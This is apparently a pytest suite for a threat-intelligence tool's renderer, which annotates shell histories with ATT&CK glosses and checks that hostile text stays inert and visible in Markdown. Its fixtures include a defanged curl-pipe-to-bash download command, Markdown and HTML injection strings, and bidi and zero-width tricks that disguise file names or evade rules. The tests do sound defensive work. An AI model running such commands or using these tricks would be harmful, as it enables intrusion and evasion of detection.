import re
import unicodedata

import pytest

from interlinear_cti import cli
from interlinear_cti.model import Gloss, Line, Source, Technique, Transcript, save
from interlinear_cti.render import code_span, render_markdown, show_invisible

BT, TL = chr(96), chr(126)
ELL, DOT = chr(0x2026), chr(0xB7)
RLO, PDF, ZWSP = chr(0x202E), chr(0x202C), chr(0x200B)
CR_PICTURE, LF_PICTURE, TAB_PICTURE = chr(0x240D), chr(0x240A), chr(0x2409)


def shown(code: int) -> str:
    """How render shows an invisible character: U+27E8, U+, the hex code (four digits or more), U+27E9."""
    return f"{chr(0x27E8)}U+{code:04X}{chr(0x27E9)}"


def demo() -> Transcript:
    rule = Gloss(source="rule", rule_id="download-pipe-shell",
                 meaning="Downloads a script and runs it in bash without saving it.",
                 techniques=[Technique(id="T1105", status="active", name="Ingress Tool Transfer"),
                             Technique(id="T1059.004", status="active", name="Unix Shell")])
    context = Gloss(source="none", meaning="Moves around or lists files; context, not an attack technique.")
    model = Gloss(source="model", by="claude-opus-5-5",
                  meaning="Starts the payload with an option that likely suppresses logging.",
                  techniques=[Technique(id="T1562.003", status="revoked", replaced_by=["T1690"])],
                  note="Inferred from the flag name; not confirmed.")
    return Transcript(
        interlinear_version="0.1.0", rules_version="2026.10.0", case="demo", datasets={"attack-enterprise": "20.0"},
        sources=[Source(id=0, name=".bash_history", sha256="ab" * 32, size=10, kind="bash_history",
                        parsed_at="2026-10-15T00:00:00Z")],
        lines=[
            Line(n=1, source=0, line=1, actor="operator", text="curl -s hxxp://203.0.113[.]5/x.sh | bash", gloss=rule),
            Line(n=2, source=0, line=2, actor="operator", text="cd /tmp", gloss=context),
            Line(n=3, source=0, line=3, actor="operator", text="foo"),
            Line(n=4, source=0, line=4, actor="operator", text="./x --stealth", gloss=model),
        ],
    )


EXPECTED = "\n".join([
    "# `demo`: interlinear transcript",
    "",
    f"Sources: `.bash_history` (sha256 `abababababab`{ELL}, 4 lines)",
    "",
    f"Glosses: 1 rule, 1 model, 0 analyst, 1 none, 1 pending {DOT} rules `2026.10.0` {DOT} ATT&CK `20.0`",
    "",
    "## `.bash_history`",
    "",
    "```text",
    "   1  curl -s hxxp://203.0.113[.]5/x.sh | bash",
    f"      T1105 Ingress Tool Transfer {DOT} T1059.004 Unix Shell   [rule: download-pipe-shell]",
    "      Downloads a script and runs it in bash without saving it.",
    "",
    "   2  cd /tmp",
    "      [context]",
    "      Moves around or lists files; context, not an attack technique.",
    "",
    "   3  foo",
    "      [pending]",
    "",
    "   4  ./x --stealth",
    "      T1562.003 (revoked, now T1690)   [model: claude-opus-5-5]",
    "      Starts the payload with an option that likely suppresses logging.",
    "      note: Inferred from the flag name; not confirmed.",
    "```",
    "",
])


def test_render_markdown_matches_the_approved_view():
    assert render_markdown(demo()) == EXPECTED


def test_agent_lines_show_actors_and_collapse_tool_output():
    t = demo()
    t.sources[0].kind = "agent_jsonl"
    t.lines = [Line(n=1, source=0, line=1, actor="agent_tool", text="id"),
               Line(n=2, source=0, line=2, actor="tool_output", text="uid=0(root)\ngid=0(root)",
                    gloss=Gloss(source="none", meaning="Tool output (not glossed)."))]
    out = render_markdown(t)
    assert "   1  [agent tool] id" in out
    assert "   2  [output: 2 lines, sha256 " in out


def test_backticks_cannot_break_the_fence():
    t = demo()
    t.lines = [Line(n=1, source=0, line=1, actor="operator", text="echo ```"),
               Line(n=2, source=0, line=2, actor="operator", text="id",
                    gloss=Gloss(source="model", by="m", meaning="Quotes ````` from the line.", confidence="low"))]
    out = render_markdown(t)
    assert "``````text" in out and out.rstrip().endswith("``````")


def test_cli_render_writes_next_to_the_transcript(tmp_path):
    path = tmp_path / "transcript.json"
    save(demo(), path)
    assert cli.main(["render", str(path)]) == 0
    assert (tmp_path / "transcript.md").read_text(encoding="utf-8") == EXPECTED


def test_context_tags_name_who_marked_the_line():
    t = demo()
    t.lines = [Line(n=1, source=0, line=1, actor="operator", text="cd /tmp",
                    gloss=Gloss(source="none", rule_id="navigation", by="rules 2026.10.0", meaning="Context.")),
               Line(n=2, source=0, line=2, actor="operator", text="frob",
                    gloss=Gloss(source="model", by="claude-opus-5-5", meaning="Clears a cache.", confidence="high")),
               Line(n=3, source=0, line=3, actor="operator", text="frob",
                    gloss=Gloss(source="analyst", by="Diego", meaning="Clears a cache.", confidence="high"))]
    out = render_markdown(t)
    assert "   1  cd /tmp\n      [context]\n" in out
    assert f"   2  frob\n      [context; model: claude-opus-5-5 {DOT} high]\n" in out
    assert f"   3  frob\n      [context; analyst: Diego {DOT} high]\n" in out


def test_model_and_analyst_tags_show_their_confidence():
    t = demo()
    t.lines = [Line(n=1, source=0, line=1, actor="operator", text="a",
                    gloss=Gloss(source="model", by="claude-opus-5-5", meaning="Guesses.", confidence="low",
                                techniques=[Technique(id="T1105", status="active", name="Ingress Tool Transfer")])),
               Line(n=2, source=0, line=2, actor="operator", text="b",
                    gloss=Gloss(source="analyst", by="Diego", meaning="Likely.", confidence="medium",
                                techniques=[Technique(id="T1105", status="active")])),
               Line(n=3, source=0, line=3, actor="operator", text="c",
                    gloss=Gloss(source="rule", rule_id="r", by="rules 2026.10.0", meaning="Shown.", confidence="high",
                                techniques=[Technique(id="T1105", status="active")])),
               Line(n=4, source=0, line=4, actor="operator", text="d",
                    gloss=Gloss(source="model", by="m", meaning="No confidence recorded.",
                                techniques=[Technique(id="T1105", status="active")]))]
    out = render_markdown(t)
    assert f"   1  a\n      T1105 Ingress Tool Transfer   [model: claude-opus-5-5 {DOT} low]\n" in out
    assert f"   2  b\n      T1105   [analyst: Diego {DOT} medium]\n" in out
    assert "   3  c\n      T1105   [rule: r]\n" in out  # rule glosses stay as they are
    assert "   4  d\n      T1105   [model: m]\n" in out


def test_header_names_every_rule_version():
    t = demo()
    t.rules_version = "2027.01.0"
    t.lines[0].gloss.by = "rules 2026.10.0"  # glossed before the library was updated
    header = (f"Glosses: 1 rule, 1 model, 0 analyst, 1 none, 1 pending {DOT} rules `2026.10.0`, `2027.01.0` "
              f"{DOT} ATT&CK `20.0`\n")
    assert header in render_markdown(t)


def test_header_names_rule_versions_held_in_history():
    t = demo()
    old_rule = t.lines[0].gloss.model_copy(update={"by": "rules 2025.09.0"})
    t.lines[0].gloss = Gloss(source="analyst", by="Diego", meaning="Reviewed.", confidence="high",
                             techniques=[Technique(id="T1105", status="active")])
    t.lines[0].history = [old_rule]  # an analyst replaced the rule gloss, which moved to history
    assert f"{DOT} rules `2025.09.0`, `2026.10.0` {DOT}" in render_markdown(t)


def test_cli_render_exits_3_when_the_output_cannot_be_written(tmp_path):
    path = tmp_path / "transcript.json"
    save(demo(), path)
    blocker = tmp_path / "blocker"
    blocker.write_text("x", encoding="utf-8")
    assert cli.main(["render", str(path), "-o", str(blocker / "out.md")]) == 3


# Values outside the fence are inline code spans: literal text, never live Markdown.

@pytest.mark.parametrize("value, span", [
    ("demo", "`demo`"),
    ("a" + BT + "b", BT * 2 + "a" + BT + "b" + BT * 2),
    (BT * 3 + "x", BT * 4 + " " + BT * 3 + "x " + BT * 4),
    ("x" + BT, BT * 2 + " x" + BT + " " + BT * 2),
    (" x ", "`  x  `"),  # CommonMark strips one space from each end of such a span
    ("   ", "`   `"),  # but not from a span of spaces only
    ("", "` `"),
    ("a\r\nb", "`a" + CR_PICTURE + LF_PICTURE + "b`"),
    ("a\tb", "`a" + TAB_PICTURE + "b`"),
    ("a" + chr(0x2028) + "b" + chr(0x2029), "`a" + shown(0x2028) + "b" + shown(0x2029) + "`"),
    ("a" + RLO + "b", "`a" + shown(0x202E) + "b`"),
])
def test_code_span(value, span):
    assert code_span(value) == span


def test_header_values_keep_their_exact_text():
    t = demo()
    name = "x[.]y (a) <b> *c* _d_ #e |f| \\g ~h~ [i](j) @k"
    t.sources[0].name = name
    out = render_markdown(t)
    assert f"Sources: `{name}` (sha256 `abababababab`{ELL}, 4 lines)" in out
    assert f"\n## `{name}`\n" in out


def test_a_tilde_fence_name_keeps_its_warning_visible():
    t = demo()
    t.sources.append(Source(id=1, name=TL * 3 + " hidden.bin", sha256="cd" * 32, size=2000, kind="unknown",
                            parsed_at="2026-10-15T00:00:00Z", rejected="binary file"))
    t.warnings = [TL * 3 + " hidden.bin: binary file; skipped", "a.bin: binary file; skipped"]
    out = render_markdown(t)
    assert f"; `{TL * 3} hidden.bin` (sha256 `cdcdcdcdcdcd`{ELL}, rejected: `binary file`)\n" in out
    assert out.endswith(f"## Warnings\n\n- `{TL * 3} hidden.bin: binary file; skipped`\n"
                        "- `a.bin: binary file; skipped`\n")


def test_a_case_with_line_breaks_stays_on_the_title_line():
    t = demo()
    t.case = "demo\n" + TL * 3 + "\r\nhidden"
    out = render_markdown(t)
    assert out.split("\n", 1)[0] == (f"# `demo{LF_PICTURE}{TL * 3}{CR_PICTURE}{LF_PICTURE}hidden`: "
                                     "interlinear transcript")
    assert not any(line.startswith(TL * 3) for line in out.split("\n"))


def test_versions_and_hashes_are_literal():
    t = demo()
    image = "!" + "[x](http://203.0.113.5/x.png)"
    t.datasets = {"attack-enterprise": "20.0 " + image}
    t.rules_version = "2026.10.0 <b>v</b>"
    t.sources[0].sha256 = "!" + "[](//a.zip)" + "0" * 53
    out = render_markdown(t)
    assert f"ATT&CK `20.0 {image}`" in out
    assert "rules `2026.10.0 <b>v</b>`" in out
    assert f"(sha256 `![](//a.zip)`{ELL}, 4 lines)" in out  # the first 12 characters


# One last pass shows every invisible character, inside the fence and out.

def test_invisible_characters_render_visibly_everywhere():
    t = demo()
    t.case = "c" + chr(0x85) + "d"
    t.sources[0].name = "notes" + RLO + "txt.sh"
    t.lines[0].text = "rm /tmp/" + RLO + "hs.galf" + PDF + " x"
    t.lines[1].text = "cu" + ZWSP + "rl --version"
    t.lines[2].text = "a\tb\rc" + chr(0x7F) + chr(0x1B) + "[31m" + chr(0xE0041) + chr(0xFEFF) + chr(0xAD)
    t.lines[3].gloss.note = "n" + chr(0x2028) + "o"
    t.warnings = ["w" + RLO + "x" + chr(0x2029)]
    out = render_markdown(t)
    assert f"# `c{shown(0x85)}d`: interlinear transcript\n" in out
    assert f"Sources: `notes{shown(0x202E)}txt.sh` (sha256" in out
    assert f"\n## `notes{shown(0x202E)}txt.sh`\n" in out
    assert f"   1  rm /tmp/{shown(0x202E)}hs.galf{shown(0x202C)} x\n" in out
    assert f"   2  cu{shown(0x200B)}rl --version\n" in out
    assert (f"   3  a\tb{shown(0x0D)}c{shown(0x7F)}{shown(0x1B)}[31m"  # a tab is inert in the fence, so kept
            f"{shown(0xE0041)}{shown(0xFEFF)}{shown(0xAD)}\n") in out
    assert f"      note: n{shown(0x2028)}o\n" in out
    assert out.endswith(f"- `w{shown(0x202E)}x{shown(0x2029)}`\n")
    assert shown(0xE0041) == chr(0x27E8) + "U+E0041" + chr(0x27E9)  # five hex digits in the tag range
    hidden = [ch for ch in out if ch not in "\n\t" and (unicodedata.category(ch) in ("Cc", "Cf")
                                                        or ch in (chr(0x2028), chr(0x2029)))]
    assert hidden == []


def test_tabs_stay_tabs_in_the_fence_and_show_as_pictures_outside_it():
    t = demo()
    t.case = "a\tcase"
    t.sources[0].name = "tab\tname.sh"
    t.lines[0].text = "for f in *; do\n\techo \"$f\"\ndone"
    t.lines[3].gloss.note = "a\tnote"
    t.warnings = ["tab\tname.sh: line 3:\tkept"]
    out = render_markdown(t)
    assert "   1  for f in *; do\n      \techo \"$f\"\n      done\n" in out
    assert "      note: a\tnote\n" in out
    assert out.startswith(f"# `a{TAB_PICTURE}case`: interlinear transcript\n")
    assert f"Sources: `tab{TAB_PICTURE}name.sh` (sha256" in out
    assert f"\n## `tab{TAB_PICTURE}name.sh`\n" in out
    assert out.endswith(f"- `tab{TAB_PICTURE}name.sh: line 3:{TAB_PICTURE}kept`\n")
    fence_open, fence_close = out.index("```text\n"), out.rindex("\n```\n")
    assert "\t" not in out[:fence_open] + out[fence_close:]


def test_show_invisible_leaves_visible_text_newlines_and_tabs():
    text = "a\nb\tc " + shown(0x202E) + " " + chr(0xE9) + chr(0x4E0B) + ELL + DOT
    assert show_invisible(text) == text
    assert show_invisible(RLO + "\n" + chr(0x0C)) == shown(0x202E) + "\n" + shown(0x0C)


# Invisible characters outside Cf: the combining grapheme joiner, variation selectors, Hangul fillers, the Khmer
# inherent vowels, and the blank braille pattern. cu, one of these, then rl displays as curl but matches no rule.
DEFAULT_IGNORABLE = [0x034F, 0xFE00, 0xFE0F, 0x180B, 0x180F, 0xE0100, 0xE01EF, 0x115F, 0x1160, 0x3164, 0xFFA0,
                     0x17B4, 0x17B5, 0x2800]


def test_default_ignorable_characters_render_visibly():
    t = demo()
    t.lines[1].text = "cu" + "".join(chr(code) for code in DEFAULT_IGNORABLE) + "rl --version"
    t.lines[3].gloss.note = "n" + chr(0x034F) + "o"
    t.warnings = ["w" + chr(0x3164) + "x"]
    out = render_markdown(t)
    assert f"   2  cu{''.join(shown(code) for code in DEFAULT_IGNORABLE)}rl --version\n" in out
    assert f"      note: n{shown(0x034F)}o\n" in out
    assert out.endswith(f"- `w{shown(0x3164)}x`\n")
    assert not any(chr(code) in out for code in DEFAULT_IGNORABLE)


def test_show_invisible_keeps_visible_scripts_and_shows_emoji_selectors():
    text = (chr(0x0416) + chr(0x0438) + " " + chr(0x4F60) + " " + chr(0xD55C) + chr(0xAE00) + " " + chr(0x1F600)
            + " e" + chr(0x0301) + chr(0xE9))
    assert show_invisible(text) == text
    # An emoji's presentation selector U+FE0F is invisible too, so it is shown after the heart; accepted.
    assert show_invisible(chr(0x2764) + chr(0xFE0F)) == chr(0x2764) + shown(0xFE0F)


# The same views as GitHub renders them, through a local CommonMark/GFM parser (never a web service). The dev
# extra installs markdown-it-py with linkify-it-py, so CI runs these; without them, they are skipped.

def gfm(markdown: str) -> str:
    markdown_it = pytest.importorskip("markdown_it")
    pytest.importorskip("linkify_it")
    md = markdown_it.MarkdownIt("gfm-like")
    # GitHub links any www. name or e-mail address, whatever its TLD; linkify-it knows only the common TLDs.
    md.linkify.tlds(["zip", "app", "sh", "mov"], True)
    return md.render(markdown)


def escaped(text: str) -> str:
    return text.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;").replace('"', "&quot;")


def hostile() -> Transcript:
    link = "www.interlinear-test.zip"
    image = "!" + "[x](http://203.0.113.5/x.png)"
    t = demo()
    t.case = "demo " + link + "\n" + TL * 3 + "\nhidden"
    t.rules_version = "2026.10.0 <b>v</b>"
    t.datasets = {"attack-enterprise": "20.0 " + image}
    t.sources = [
        Source(id=0, name=link, sha256="ab" * 32, size=10, kind="agent_jsonl", parsed_at="x"),
        Source(id=1, name=TL * 3 + " hidden.bin", sha256="!" + "[](//a.zip)" + "0" * 53, size=10, kind="unknown",
               parsed_at="x", rejected="binary " + image),
        Source(id=2, name="ops@interlinear-test.zip [l](http://203.0.113.7/) &amp; _e_ " + BT * 3, sha256="cd" * 32,
               size=10, kind="bash_history", parsed_at="x"),
    ]
    t.lines = [
        Line(n=1, source=0, line=1, actor="agent_tool", text="echo " + BT * 7 + " " + link),
        Line(n=2, source=2, line=1, actor="operator", text=TL * 3 + "\n</pre><b>x</b>\n" + BT * 3),
    ]
    t.warnings = [TL * 3 + " hidden.bin: binary file; skipped",
                  "agent.jsonl: line 7: unknown role 'Robot " + link + "'",
                  "a\n\nSetext\n===",
                  "<b>x</b> &#x202E; " + image,
                  BT * 3 + "text"]
    return t


def test_the_local_gfm_check_links_plain_text():
    html = gfm("see www.interlinear-test.zip, ops@interlinear-test.zip and " + "!" + "[x](http://203.0.113.5/x.png)")
    assert html.count("<a ") == 2 and "<img" in html  # so the checks below are not vacuous


def test_github_rendering_has_no_live_markup_outside_the_fences():
    t = hostile()
    html = gfm(render_markdown(t))
    assert "<a " not in html and "<img" not in html
    assert html.count("<pre>") == 2  # one per source with lines; nothing else opens a code block
    assert set(re.findall(r"</?([a-z0-9]+)", html)) <= {"h1", "h2", "p", "ul", "li", "code", "pre"}
    title = escaped(t.case.replace(chr(10), LF_PICTURE))
    assert html.startswith(f"<h1><code>{title}</code>: interlinear transcript</h1>\n")
    assert f"<code>{escaped(t.datasets['attack-enterprise'])}</code>" in html
    for warning in t.warnings:  # every warning shown whole, as its own list item
        assert f"<li><code>{escaped(warning.replace(chr(10), LF_PICTURE))}</code></li>" in html


@pytest.mark.parametrize("value", ["a" + BT + "b", BT * 3 + "x", "x" + BT, BT, BT + " " + BT, " x ", "   ",
                                   "<b>x</b> &amp; *y* _z_ www.interlinear-test.zip", "a\nb", "a\tb"])
def test_code_spans_show_their_value_exactly_under_gfm(value):
    html = gfm("x " + code_span(value) + " y")
    pictured = value.replace(chr(10), LF_PICTURE).replace(chr(9), TAB_PICTURE)
    assert html == f"<p>x <code>{escaped(pictured)}</code> y</p>\n"


def test_a_tab_indented_script_keeps_its_tabs_under_gfm():
    t = demo()
    t.lines = [Line(n=1, source=0, line=1, actor="operator", text="if true; then\n\t\techo " + BT * 3 + "\nfi")]
    html = gfm(render_markdown(t))
    assert html.count("<pre>") == 1
    assert "   1  if true; then\n      \t\techo " + BT * 3 + "\n      fi\n" in html
